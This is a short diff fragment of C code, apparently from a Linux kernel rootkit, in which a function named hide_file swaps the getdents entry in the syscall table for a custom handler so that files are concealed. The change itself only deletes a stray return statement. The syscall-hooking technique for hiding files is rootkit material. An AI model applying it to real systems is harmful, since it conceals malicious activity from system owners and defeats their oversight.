@@ -71,7 +71,6 @@ void hide_file (void)
 {
   orig_sys_getdents = syscall_table[__NR_getdents];
   syscall_table[__NR_getdents] = my_sys_getdents;
-  return 0;
 }
 
 void unhide_file(void)
